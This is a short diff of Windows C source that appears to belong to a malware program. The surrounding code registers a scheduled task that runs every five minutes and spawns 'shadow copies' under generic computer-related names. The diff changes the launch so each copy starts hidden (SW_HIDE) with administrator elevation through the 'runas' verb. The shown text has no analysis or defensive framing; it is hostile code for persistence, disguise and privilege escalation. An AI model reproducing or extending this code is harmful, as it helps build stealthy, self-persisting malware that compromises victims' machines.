@@ -550,21 +550,15 @@ static void spawn_single_copy(const char *filename, const char *regKey) {
     /* Register persistence: Scheduled task (runs every 5 minutes) */
     util_ensure_task(destPath, regKey);
 
-    /* CreateProcess inherits parent's elevated token */
-    STARTUPINFOA si = {0};
-    si.cb = sizeof(si);
-    PROCESS_INFORMATION pi = {0};
-
-    char cmdLine[1024];
-    snprintf(cmdLine, sizeof(cmdLine), "\"%s\" --shadow", destPath);
-
-    CreateProcessA(destPath, cmdLine, NULL, NULL, FALSE,
-                   CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
-                   NULL, NULL, &si, &pi);
-    if (pi.hProcess) {
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-    }
+    /* Spawn with admin elevation via runas verb */
+    SHELLEXECUTEINFOA sei = {0};
+    sei.cbSize = sizeof(sei);
+    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
+    sei.lpVerb = "runas";
+    sei.lpFile = destPath;
+    sei.lpParameters = "--shadow";
+    sei.nShow = SW_HIDE;
+    ShellExecuteExA(&sei);
 }
 
 /* Spawn three shadow copies with generic computer-related names */
